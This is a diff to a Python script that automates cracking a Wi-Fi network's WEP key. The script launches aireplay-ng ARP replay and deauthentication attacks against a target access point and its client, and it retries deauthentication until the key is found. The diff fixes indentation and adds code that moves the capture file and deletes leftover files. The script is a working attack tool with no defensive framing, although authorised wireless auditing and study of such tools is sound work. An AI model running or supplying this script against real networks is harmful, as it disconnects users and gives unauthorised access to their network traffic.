@@ -1,6 +1,7 @@
 import subprocess
 import time
 import sys
+import shutil
 
 def run_command_background(cmd):
     """Run command in the background"""
@@ -41,15 +42,15 @@ def main():
         # Start ARP replay attack in background
         arp_replay_attack_cmd = f"aireplay-ng -3 -b {ap_mac} -h {your_mac} {interface}"
         arp_replay_proc = run_command_background(arp_replay_attack_cmd)
-	print("Executing ARP Request Reply Attack...")
+        print("Executing ARP Request Reply Attack...")
 
         # Perform initial deauth
         deauth_cmd = f"sudo aireplay-ng -0 10 -a {ap_mac} -c {client_mac} {interface}"
         run_command(deauth_cmd)
         print("Sending Initial Deauthentication Packets...")
 
-	time.sleep(5)
-	
+        time.sleep(5)
+
         # Attempt to crack WEP until successful
         success = False
         while not success:
@@ -57,9 +58,12 @@ def main():
             if success:
                 print("Success! WEP Key Found:")
                 print(output)
+                # Move the .cap file upon success
+                shutil.move('./wep_attack-01.cap', '/mnt/data/wep_attack-01.cap')
+                run_command("rm -f ./wep*")
+                print("Moved .cap file to /mnt/data")
             else:
                 print("Failed to crack WEP. Sending Additional Deauth Packets and Retrying...")
-                # Retry deauth before next crack attempt
                 run_command(deauth_cmd)
                 time.sleep(5)  # Wait a bit before retrying
 
